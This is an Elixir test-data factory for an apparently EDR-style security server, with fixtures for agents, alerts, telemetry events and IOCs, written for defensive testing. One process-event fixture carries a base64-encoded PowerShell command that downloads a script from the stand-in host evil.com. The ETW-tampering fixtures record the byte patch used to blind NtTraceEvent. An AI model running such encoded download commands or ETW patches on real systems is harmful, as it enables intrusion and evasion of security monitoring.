defmodule TamanduaServer.Factory do
  @moduledoc """
  Test data factory for creating test fixtures.
  Uses ExMachina and Faker for generating realistic test data.
  """

  use ExMachina.Ecto, repo: TamanduaServer.Repo

  alias TamanduaServer.Accounts.{Organization, User}
  alias TamanduaServer.Agents.{Agent, AgentCredential}
  alias TamanduaServer.Alerts.Alert
  alias TamanduaServer.Alerts.SuppressionRule
  alias TamanduaServer.Bounties.Submission
  alias TamanduaServer.Detection.ExclusionRule
  alias TamanduaServer.Telemetry.Event

  @doc """
  Build a struct with the given attributes (does not persist).
  Kept for backward compatibility. Use build/2 from ExMachina instead.
  """
  def build_legacy(factory_name, attrs \\ %{})

  # ExMachina factories
  def organization_factory do
    %Organization{
      name: Faker.Company.name(),
      slug: Faker.Internet.slug(),
      inserted_at: DateTime.utc_now() |> DateTime.truncate(:second),
      updated_at: DateTime.utc_now() |> DateTime.truncate(:second)
    }
  end

  def user_factory do
    %User{
      email: Faker.Internet.email(),
      name: Faker.Person.name(),
      password_hash: Bcrypt.hash_pwd_salt("password123"),
      role: "analyst",
      is_active: true,
      organization: build(:organization),
      inserted_at: DateTime.utc_now() |> DateTime.truncate(:second),
      updated_at: DateTime.utc_now() |> DateTime.truncate(:second)
    }
  end

  def agent_factory do
    %Agent{
      hostname: Faker.Internet.domain_word() <> "-" <> Integer.to_string(:rand.uniform(9999)),
      ip_address: Faker.Internet.ip_v4_address(),
      os_type: Enum.random(["windows", "linux", "macos"]),
      os_version: "10.0.19045",
      agent_version: "0.1.0",
      machine_id: :crypto.strong_rand_bytes(16),
      status: "online",
      last_seen_at: NaiveDateTime.utc_now() |> NaiveDateTime.truncate(:second),
      config: %{},
      tags: [],
      organization: build(:organization),
      inserted_at: NaiveDateTime.utc_now() |> NaiveDateTime.truncate(:second),
      updated_at: NaiveDateTime.utc_now() |> NaiveDateTime.truncate(:second)
    }
  end

  def agent_credential_factory do
    now = DateTime.utc_now()
    jti = :crypto.strong_rand_bytes(32) |> Base.url_encode64(padding: false)
    org = build(:organization)
    agent = build(:agent, organization: org)

    %AgentCredential{
      jti: jti,
      issued_at: now,
      expires_at: DateTime.add(now, 24 * 3600, :second),
      use_count: 0,
      agent: agent,
      organization: org,
      inserted_at: now |> DateTime.truncate(:second),
      updated_at: now |> DateTime.truncate(:second)
    }
  end

  def alert_factory do
    %Alert{
      severity: Enum.random(["low", "medium", "high", "critical"]),
      title: Faker.Lorem.sentence(4),
      description: Faker.Lorem.paragraph(),
      status: "new",
      source_event_id: Ecto.UUID.generate(),
      event_ids: [Ecto.UUID.generate()],
      evidence: %{},
      process_chain: [],
      raw_event: %{},
      mitre_tactics: ["execution"],
      mitre_techniques: ["T1059.001"],
      threat_score: :rand.uniform() * 0.5 + 0.5,
      organization: build(:organization),
      agent: build(:agent),
      inserted_at: DateTime.utc_now() |> DateTime.truncate(:second),
      updated_at: DateTime.utc_now() |> DateTime.truncate(:second)
    }
  end

  def event_factory do
    %Event{
      event_type: Enum.random(["process_create", "file_create", "network_connect", "dns_query"]),
      timestamp: DateTime.utc_now(),
      payload: %{},
      enrichment: %{},
      sha256: nil,
      agent: build(:agent),
      created_at: DateTime.utc_now() |> DateTime.truncate(:second)
    }
  end

  def etw_tampering_alert_factory do
    %Alert{
      severity: "critical",
      title: "ETW Function Patched: NtTraceEvent (xor_eax_ret)",
      description: "ETW tampering detected - a process has attempted to patch critical Windows tracing functions to evade EDR telemetry collection.",
      status: "new",
      source_event_id: Ecto.UUID.generate(),
      event_ids: [Ecto.UUID.generate()],
      evidence: %{
        "etw_tampering" => %{
          "target_function" => "NtTraceEvent",
          "patch_pattern" => "xor_eax_ret",
          "target_region" => "syscall_stub",
          "detection_method" => "prologue_scan",
          "process_name" => "malware.exe",
          "process_id" => 1234
        }
      },
      process_chain: [],
      raw_event: %{
        "event_type" => "etw_prologue_patched",
        "payload" => %{
          "target_function" => "NtTraceEvent",
          "original_bytes" => <<0x4C, 0x8B, 0xD1, 0xB8, 0x5E, 0x00, 0x00, 0x00>>,
          "patched_bytes" => <<0x31, 0xC0, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00>>,
          "patch_pattern" => "xor_eax_ret"
        }
      },
      mitre_tactics: ["Defense Evasion"],
      mitre_techniques: ["T1562.006"],
      threat_score: 95.0,
      target_function: "NtTraceEvent",
      original_bytes: <<0x4C, 0x8B, 0xD1, 0xB8, 0x5E, 0x00, 0x00, 0x00>>,
      patched_bytes: <<0x31, 0xC0, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00>>,
      patch_pattern: "xor_eax_ret",
      target_region: "syscall_stub",
      detection_metadata: %{
        "event_type" => "etw_prologue_patched",
        "detection_source" => "etw_tampering_monitor",
        "original_bytes_hex" => "4c8bd1b85e000000",
        "patched_bytes_hex" => "31c0c30000000000"
      },
      organization: build(:organization),
      agent: build(:agent),
      inserted_at: DateTime.utc_now() |> DateTime.truncate(:second),
      updated_at: DateTime.utc_now() |> DateTime.truncate(:second)
    }
  end

  def etw_tampering_event_factory do
    %Event{
      event_type: "etw_prologue_patched",
      timestamp: DateTime.utc_now(),
      payload: %{
        "target_function" => "NtTraceEvent",
        "original_bytes" => Base.encode16(<<0x4C, 0x8B, 0xD1, 0xB8, 0x5E, 0x00, 0x00, 0x00>>),
        "patched_bytes" => Base.encode16(<<0x31, 0xC0, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00>>),
        "patch_pattern" => "xor_eax_ret",
        "target_region" => "syscall_stub",
        "detection_method" => "prologue_scan",
        "process_name" => "malware.exe",
        "process_id" => 1234
      },
      enrichment: %{},
      sha256: nil,
      agent: build(:agent),
      created_at: DateTime.utc_now() |> DateTime.truncate(:second)
    }
  end

  # Legacy build functions (for backward compatibility)
  def build_legacy(:organization, attrs) do
    %Organization{
      id: Ecto.UUID.generate(),
      name: Faker.Company.name(),
      slug: Faker.Internet.slug(),
      inserted_at: DateTime.utc_now() |> DateTime.truncate(:second),
      updated_at: DateTime.utc_now() |> DateTime.truncate(:second)
    }
    |> Map.merge(Enum.into(attrs, %{}))
  end

  def build(:user, attrs) do
    %User{
      id: Ecto.UUID.generate(),
      email: Faker.Internet.email(),
      name: Faker.Person.name(),
      role: "analyst",
      inserted_at: DateTime.utc_now() |> DateTime.truncate(:second),
      updated_at: DateTime.utc_now() |> DateTime.truncate(:second)
    }
    |> Map.merge(Enum.into(attrs, %{}))
  end

  def build(:agent, attrs) do
    %Agent{
      id: Ecto.UUID.generate(),
      hostname: Faker.Internet.domain_word() <> "-" <> Faker.Lorem.characters(4),
      ip_address: Faker.Internet.ip_v4_address(),
      os_type: Enum.random(["windows", "linux", "macos"]),
      os_version: "10.0.19045",
      agent_version: "0.1.0",
      machine_id: :crypto.strong_rand_bytes(16),
      status: "online",
      last_seen_at: NaiveDateTime.utc_now() |> NaiveDateTime.truncate(:second),
      config: %{},
      tags: [],
      inserted_at: NaiveDateTime.utc_now() |> NaiveDateTime.truncate(:second),
      updated_at: NaiveDateTime.utc_now() |> NaiveDateTime.truncate(:second)
    }
    |> Map.merge(Enum.into(attrs, %{}))
  end

  def build(:alert, attrs) do
    %Alert{
      id: Ecto.UUID.generate(),
      severity: Enum.random([:low, :medium, :high, :critical]),
      title: Faker.Lorem.sentence(4),
      description: Faker.Lorem.paragraph(),
      status: "open",
      source_event_id: Ecto.UUID.generate(),
      event_ids: [Ecto.UUID.generate()],
      evidence: %{},
      process_chain: [],
      raw_event: %{},
      mitre_tactics: ["execution"],
      mitre_techniques: ["T1059.001"],
      threat_score: :rand.uniform() * 0.5 + 0.5,
      inserted_at: DateTime.utc_now() |> DateTime.truncate(:second),
      updated_at: DateTime.utc_now() |> DateTime.truncate(:second)
    }
    |> Map.merge(Enum.into(attrs, %{}))
  end

  def build(:event, attrs) do
    %Event{
      id: Ecto.UUID.generate(),
      event_type: Enum.random(["process_create", "file_create", "network_connect", "dns_query"]),
      timestamp: DateTime.utc_now(),
      payload: %{},
      enrichment: %{},
      sha256: nil,
      created_at: DateTime.utc_now() |> DateTime.truncate(:second)
    }
    |> Map.merge(Enum.into(attrs, %{}))
  end

  def build(:process_event, attrs) do
    pid = :rand.uniform(65535)
    build(:event, %{
      event_type: "process_create",
      payload: %{
        "pid" => pid,
        "ppid" => :rand.uniform(65535),
        "name" => Enum.random(["cmd.exe", "powershell.exe", "notepad.exe", "explorer.exe"]),
        "path" => "C:\\Windows\\System32\\#{Enum.random(["cmd.exe", "notepad.exe"])}",
        "cmdline" => "/c whoami",
        "user" => "SYSTEM",
        "is_elevated" => Enum.random([true, false]),
        "is_signed" => true,
        "signer" => "Microsoft Corporation"
      }
    })
    |> Map.merge(Enum.into(attrs, %{}))
  end

  def build(:suspicious_process_event, attrs) do
    pid = :rand.uniform(65535)
    build(:event, %{
      event_type: "process_create",
      payload: %{
        "pid" => pid,
        "ppid" => :rand.uniform(65535),
        "name" => "powershell.exe",
        "path" => "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "cmdline" => "-enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
        "user" => "SYSTEM",
        "is_elevated" => true,
        "is_signed" => true,
        "signer" => "Microsoft Corporation"
      }
    })
    |> Map.merge(Enum.into(attrs, %{}))
  end

  def build(:file_event, attrs) do
    build(:event, %{
      event_type: "file_create",
      payload: %{
        "path" => "C:\\Users\\test\\Downloads\\suspicious.exe",
        "sha256" => :crypto.strong_rand_bytes(32) |> Base.encode16(case: :lower),
        "size" => :rand.uniform(1_000_000),
        "entropy" => :rand.uniform() * 3 + 5,
        "is_executable" => true
      }
    })
    |> Map.merge(Enum.into(attrs, %{}))
  end

  def build(:network_event, attrs) do
    build(:event, %{
      event_type: "network_connect",
      payload: %{
        "pid" => :rand.uniform(65535),
        "process_name" => "powershell.exe",
        "local_ip" => "192.168.1.100",
        "local_port" => :rand.uniform(65535),
        "remote_ip" => Faker.Internet.ip_v4_address(),
        "remote_port" => Enum.random([80, 443, 8080, 4443]),
        "protocol" => "tcp",
        "direction" => "outbound"
      }
    })
    |> Map.merge(Enum.into(attrs, %{}))
  end

  def build(:dns_event, attrs) do
    build(:event, %{
      event_type: "dns_query",
      payload: %{
        "pid" => :rand.uniform(65535),
        "process_name" => "chrome.exe",
        "query" => Faker.Internet.domain_name(),
        "query_type" => "A",
        "response_ips" => [Faker.Internet.ip_v4_address()]
      }
    })
    |> Map.merge(Enum.into(attrs, %{}))
  end

  def build(:telemetry_batch, attrs) do
    agent_id = attrs[:agent_id] || Ecto.UUID.generate()
    event_count = attrs[:event_count] || 5

    events = Enum.map(1..event_count, fn _ ->
      build(:process_event, %{agent_id: agent_id})
      |> Map.from_struct()
      |> Map.take([:id, :event_type, :timestamp, :payload])
      |> Map.put(:event_id, Ecto.UUID.generate())
    end)

    %{
      agent_id: agent_id,
      events: events,
      batch_timestamp: System.system_time(:millisecond)
    }
    |> Map.merge(Enum.into(attrs, %{}))
  end

  @doc """
  Insert a struct into the database.
  """
  def insert!(factory_name, attrs \\ %{}) do
    factory_name
    |> build(attrs)
    |> Repo.insert!()
  end

  @doc """
  Create a complete test agent with organization.
  """
  def create_agent_with_org(attrs \\ %{}) do
    org = insert!(:organization)
    agent = insert!(:agent, Map.put(attrs, :organization_id, org.id))
    {org, agent}
  end

  @doc """
  Generate a JWT token for testing.
  """
  def generate_test_token(agent_id) do
    claims = %{
      "agent_id" => agent_id,
      "exp" => DateTime.utc_now() |> DateTime.add(3600, :second) |> DateTime.to_unix()
    }

    case TamanduaServer.Guardian.encode_and_sign(%{id: agent_id}, claims) do
      {:ok, token, _claims} -> token
      _ -> "dev-token-#{agent_id}"
    end
  rescue
    _ -> "dev-token-#{agent_id}"
  end

  def build(:attack_chain, attrs) do
    %TamanduaServer.Detection.AttackChain{
      id: Ecto.UUID.generate(),
      name: "Test Attack Chain #{:rand.uniform(1000)}",
      description: Faker.Lorem.sentence(),
      severity: Enum.random(["critical", "high", "medium", "low"]),
      enabled: true,
      test_mode: false,
      author: "Test Suite",
      version: "1.0",
      tags: ["test", "automated"],
      trigger_count: 0,
      false_positive_count: 0,
      definition: %{
        "steps" => [
          %{
            "name" => "Step 1",
            "techniques" => ["T1110"],
            "threshold" => 1,
            "timeframe" => 300,
            "description" => "First step"
          },
          %{
            "name" => "Step 2",
            "techniques" => ["T1078"],
            "threshold" => 1,
            "timeframe" => 600,
            "conditions" => %{"same_user" => true},
            "description" => "Second step"
          }
        ],
        "narrative_template" => "Test chain triggered by {user} from {source_ip}"
      },
      inserted_at: DateTime.utc_now() |> DateTime.truncate(:second),
      updated_at: DateTime.utc_now() |> DateTime.truncate(:second)
    }
    |> Map.merge(Enum.into(attrs, %{}))
  end

  def build(:ioc, attrs) do
    %TamanduaServer.Detection.IOC{
      id: Ecto.UUID.generate(),
      type: Enum.random(["hash_sha256", "hash_md5", "ip", "domain", "url"]),
      value: case Enum.random(["hash_sha256", "hash_md5", "ip", "domain", "url"]) do
        "hash_sha256" -> :crypto.strong_rand_bytes(32) |> Base.encode16(case: :lower)
        "hash_md5" -> :crypto.strong_rand_bytes(16) |> Base.encode16(case: :lower)
        "ip" -> Faker.Internet.ip_v4_address()
        "domain" -> Faker.Internet.domain_name()
        "url" -> Faker.Internet.url()
      end,
      description: Faker.Lorem.sentence(),
      enabled: true,
      source: "test_factory",
      severity: Enum.random(["low", "medium", "high", "critical"]),
      confidence: :rand.uniform(),
      tags: ["test"],
      metadata: %{},
      inserted_at: DateTime.utc_now() |> DateTime.truncate(:second),
      updated_at: DateTime.utc_now() |> DateTime.truncate(:second)
    }
    |> Map.merge(Enum.into(attrs, %{}))
  end

  def build(:saved_search, attrs) do
    %TamanduaServer.Alerts.SavedSearch{
      id: Ecto.UUID.generate(),
      name: Faker.Lorem.sentence(3),
      description: Faker.Lorem.paragraph(1),
      filter_json: %{
        "logic" => "AND",
        "conditions" => [
          %{"field" => "severity", "operator" => "eq", "value" => "critical"}
        ]
      },
      is_shared: false,
      is_template: false,
      is_starred: false,
      category: nil,
      version: 1,
      usage_count: 0,
      inserted_at: DateTime.utc_now() |> DateTime.truncate(:second),
      updated_at: DateTime.utc_now() |> DateTime.truncate(:second)
    }
    |> Map.merge(Enum.into(attrs, %{}))
  end

  def exclusion_rule_factory do
    %ExclusionRule{
      name: "Test Exclusion Rule #{:rand.uniform(10000)}",
      description: "Auto-generated exclusion rule for testing",
      enabled: true,
      rule_type: "suppress",
      criteria: %{},
      hash_patterns: [],
      path_patterns: [],
      cmdline_patterns: [],
      ip_patterns: [],
      domain_patterns: [],
      rule_name_patterns: [],
      source_agent_ids: [],
      source_hostnames: [],
      time_based: false,
      match_count: 0,
      organization: build(:organization),
      inserted_at: DateTime.utc_now() |> DateTime.truncate(:second),
      updated_at: DateTime.utc_now() |> DateTime.truncate(:second)
    }
  end

  def suppression_rule_factory do
    %SuppressionRule{
      name: "Test Suppression Rule #{:rand.uniform(10000)}",
      description: "Auto-generated suppression rule for testing",
      enabled: true,
      action: "suppress",
      rule_name_pattern: nil,
      process_name_pattern: nil,
      title_pattern: "Test Alert*",
      severity: nil,
      mitre_techniques: [],
      tags: [],
      criteria: %{},
      time_window_type: "indefinite",
      priority: 0,
      exempted_agent_ids: [],
      exempted_users: [],
      match_count: 0,
      add_tags: [],
      is_template: false,
      organization: build(:organization),
      inserted_at: DateTime.utc_now() |> DateTime.truncate(:microsecond),
      updated_at: DateTime.utc_now() |> DateTime.truncate(:microsecond)
    }
  end

  def submission_factory do
    %Submission{
      type: "ioc",
      contributor_wallet: "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU",
      payload: %{
        "ioc_type" => "hash_sha256",
        "value" => :crypto.strong_rand_bytes(32) |> Base.encode16(case: :lower)
      },
      title: "Test IOC Submission #{:rand.uniform(10000)}",
      description: "Auto-generated submission for testing",
      status: "submitted",
      bounty_eligibility: "pending_review",
      risk_flags: [],
      techniques_covered: [],
      benchmark_testable: false,
      org_observation_count: 0,
      organization: build(:organization),
      inserted_at: DateTime.utc_now() |> DateTime.truncate(:microsecond),
      updated_at: DateTime.utc_now() |> DateTime.truncate(:microsecond)
    }
  end

  def build(:notification_integration, attrs) do
    %TamanduaServer.Notifications.Integration{
      id: Ecto.UUID.generate(),
      name: "Test #{Enum.random(["Slack", "Teams", "Email"])} Integration",
      provider: Enum.random(["slack", "teams", "email", "pagerduty", "opsgenie", "discord", "telegram"]),
      enabled: true,
      config: %{
        webhook_url: "https://hooks.example.com/services/test"
      },
      template_title: "Alert: {{ alert.title }}",
      template_body: "Severity: {{ alert.severity }}\nAgent: {{ agent.hostname }}",
      routing_rules: %{},
      throttle_enabled: false,
      throttle_max_per_hour: 60,
      failure_count: 0,
      total_sent: 0,
      total_failed: 0,
      inserted_at: DateTime.utc_now() |> DateTime.truncate(:second),
      updated_at: DateTime.utc_now() |> DateTime.truncate(:second)
    }
    |> Map.merge(Enum.into(attrs, %{}))
  end

  def build(:delivery_log, attrs) do
    %TamanduaServer.Notifications.DeliveryLog{
      id: Ecto.UUID.generate(),
      status: Enum.random(["sent", "failed", "throttled", "retry"]),
      provider: Enum.random(["slack", "teams", "email"]),
      recipient: "#alerts",
      rendered_title: "Test Alert",
      rendered_body: "This is a test notification",
      delivered_at: DateTime.utc_now() |> DateTime.truncate(:second),
      retry_count: 0,
      inserted_at: DateTime.utc_now() |> DateTime.truncate(:second),
      updated_at: DateTime.utc_now() |> DateTime.truncate(:second)
    }
    |> Map.merge(Enum.into(attrs, %{}))
  end

  @doc """
  Create connect params for agent socket testing.
  """
  def agent_connect_params(agent) do
    %{
      "agent_id" => agent.id,
      "token" => generate_test_token(agent.id),
      "hostname" => agent.hostname,
      "os_type" => agent.os_type,
      "os_version" => agent.os_version,
      "agent_version" => agent.agent_version
    }
  end
end
